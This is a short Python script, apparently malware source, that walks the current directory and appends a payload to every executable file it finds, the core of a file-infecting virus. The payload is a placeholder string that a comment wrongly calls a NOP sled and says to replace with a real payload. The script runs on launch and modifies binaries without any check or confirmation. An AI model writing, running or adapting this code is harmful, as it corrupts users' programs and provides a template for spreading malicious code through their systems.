import os

# Define the payload to inject
payload = b'yoyoyooyoyoy'  # Example payload (NOP sled); replace with actual payload

def is_executable(file_path):
    """Check if the file is executable."""
    return os.path.isfile(file_path) and os.access(file_path, os.X_OK)

def inject_payload(file_path):
    """Inject payload into the file."""
    with open(file_path, 'ab') as f:
        f.write(payload)
    print(f"Injected payload into {file_path}")

def search_and_inject(base_path):
    """Recursively search for executable files and inject payload."""
    for root, dirs, files in os.walk(base_path):
        for file in files:
            file_path = os.path.join(root, file)
            if is_executable(file_path):
                inject_payload(file_path)

# Specify the directory to search (current directory)
base_path = os.getcwd()  # Get the current working directory
search_and_inject(base_path)
